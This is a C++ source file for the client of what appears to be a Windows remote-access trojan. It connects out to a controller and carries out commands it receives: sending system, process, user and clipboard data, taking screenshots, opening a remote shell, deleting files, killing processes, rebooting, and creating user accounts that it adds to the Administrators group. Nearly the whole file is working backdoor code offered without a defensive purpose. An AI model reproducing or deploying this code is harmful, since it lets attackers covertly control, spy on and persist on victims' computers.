#include "commander.h"

#include <winsock2.h>
#include <io.h>

Commander::Commander(){
    initWSA();
    initSocket();
}

Commander::~Commander(){
    closeServer();
    WSACleanup();
}

bool Commander::initSocket(){
    if((s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0)))
        return true;
    return false;
}

bool Commander::connectServer(char* addr, uint16_t port){
    sin.sin_addr.S_un.S_addr = inet_addr(addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    if(WSAConnect(s, (const struct sockaddr*)&sin, sizeof(sin), nullptr, nullptr, nullptr, nullptr) != SOCKET_ERROR)
        return true;
    return false;
}

void Commander::closeServer(){
    closesocket(s);
}

bool Commander::initWSA(){
    if(WSAStartup(MAKEWORD(2, 2), &wsdata) != SOCKET_ERROR)
        return true;
    return false;
}

void Commander::parserCommand(){
    while(recv(s, (char*)&data, LEN_DATA, 0) > 0){
        switch(data.cmd){
            case SYS :
                systemInfo = sysInfo.getSysInfo();
                send(s, (char*)&systemInfo, sizeof(systemInfo), 0);
                break;
            case SYSNET :
                netInfo = sysInfo.getNetInfo();
                if(netInfo.size() > 0){
                    for(size_t count = 0; count < netInfo.size(); count++)
                        send(s, (char*)&netInfo[count], sizeof(netInfo[count]), 0);
                }
                break;
            case DISK :
                lsDisk = disk.getListDisk();
                if(lsDisk.size() > 0)
                    for(size_t count = 0; count < lsDisk.size(); count++)
                        send(s, (char*)&lsDisk[count], sizeof(lsDisk[count]), 0);
                break;
            case LSDIR :
                lsDir = listDir.getListDir(data.data);
                if(lsDir.size() > 0){
                    for(size_t count = 0; count < lsDir.size(); count++)
                        send(s, (char*)&lsDir[count], sizeof(lsDir[count]), 0);
                }
                break;
            case RMDIR :
                if(listDir.removeDir(data.data)){
                    data.err = 0;
                    send(s, (char*)&data, sizeof(data), 0);
                }
                break;
            case RMFILE :
                if(listDir.removeFile(data.data)){
                    data.err = 0;
                    send(s, (char*)&data, sizeof(data), 0);
                }
                break;
            case CRFILE :
                listDir.createFile(data.data);
                break;
            case CRDIR :
                listDir.createDir(data.data);
                break;
            case RNAME :
                arg1 = strtok(data.data, " ");
                arg2 = strtok(nullptr, " ");
                listDir.renames(arg1, arg2);
                break;
            case ATTR :
                listDir.setAttribute(data.data, data.other);
                break;
            case LSPROC :
                lsProc = proc.getListProcess();
                if(lsProc.size() > 0)
                    for(size_t count = 0; count < lsProc.size(); count++)
                        send(s, (char*)&lsProc[count], sizeof(lsProc[count]), 0);
                break;
            case CRPROC :
                if(proc.createProcess(data.data, data.other)){
                    data.err = 0;
                    send(s, (char*)&data, sizeof(data), 0);
                }
                break;
            case KILLP :
                if(proc.killProcess(data.data)){
                    data.err = 0;
                    send(s, (char*)&data, sizeof(data), 0);
                }
                break;
            case SHELL :
                shell.remoteShell(data.data, s);
                break;
            case REBOOT :
                host.reboot();
                break;
            case POWEROFF :
                host.powerOff();
                break;
            case LOGONOFF :
                host.logonOff();
                break;
            case SCREEN :
                host.screenShot(s);
            case LSUSR :
                lsUser = users.listUsers();
                if(lsUser.size() > 0)
                    for(size_t count = 0; count < lsUser.size(); count++)
                        send(s, (char*)&lsUser[count], sizeof(lsUser[count]), 0);
                break;
            case CRUSR :
                arg1 = strtok(data.data, " ");
                arg2 = strtok(nullptr, " ");
                if(users.createUser(arg1, arg2)){
                    groups.addUserGroup(arg1, "Администраторы");
                    data.err = 0;
                    send(s, (char*)&data, sizeof(data), 0);
                }
                break;
            case RMUSR :
                if(users.removeUser(data.data)){
                    data.err = 0;
                    send(s, (char*)&data, sizeof(data), 0);
                }
                break;
            case BLCKUSR :
                if(users.blockUser(data.data)){
                    data.err = 0;
                    send(s, (char*)&data, sizeof(data), 0);
                }
                break;
            case PASSUSR :
                arg1 = strtok(data.data, " ");
                arg2 = strtok(nullptr, " ");
                arg3 = strtok(nullptr, " ");
                if(users.changePassword(arg1, arg2, arg3)){
                    data.err = 0;
                    send(s, (char*)&data, sizeof(data), 0);
                }
                break;
            case LSGRP :
                lsGroup = groups.listGroups();
                if(lsGroup.size() > 0)
                    for(size_t count = 0; count < lsGroup.size(); count++)
                        send(s, (char*)&lsGroup[count], sizeof(lsGroup[count]), 0);
                break;
            case CRGRP :
                if(groups.createGroup(data.data)){
                    data.err = 0;
                    send(s, (char*)&data, sizeof(data), 0);
                }
                break;
            case RMGRP :
                if(groups.removeGroup(data.data)){
                    data.err = 0;
                    send(s, (char*)&data, sizeof(data), 0);
                }
                break;
            case ADDUSRGRP :
                arg1 = strtok(data.data, " ");
                arg2 = strtok(nullptr, " ");
                if(groups.addUserGroup(arg1, arg2)){
                    data.err = 0;
                    send(s, (char*)&data, sizeof(data), 0);
                }
                break;
            case LSSRV :
                lsService = srv.getListService();
                if(lsService.size() > 0)
                    for(size_t count = 0; count < lsService.size(); count++)
                        send(s, (char*)&lsService[count], sizeof(lsService[count]), 0);
                break;
            case CLBUF :
                buffer = host.getClipBoard();
                if(! buffer.empty())
                    send(s, buffer.c_str(), strlen(buffer.c_str()), 0);
                break;
            case DOWNLOAD :
                break;
            case UPLOAD :
                break;
        }
    }
}
